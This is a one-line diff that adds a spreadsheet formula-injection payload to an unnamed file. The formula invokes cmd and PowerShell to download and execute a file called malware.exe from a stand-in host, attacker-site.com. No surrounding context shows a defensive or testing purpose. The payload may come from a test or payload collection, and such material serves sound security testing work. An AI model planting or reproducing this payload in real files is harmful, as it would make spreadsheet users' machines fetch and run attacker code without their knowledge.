@@ -1,0 +1,1 @@
+=cmd|'/C powershell IEX(wget attacker-site.com/malware.exe)'!A0
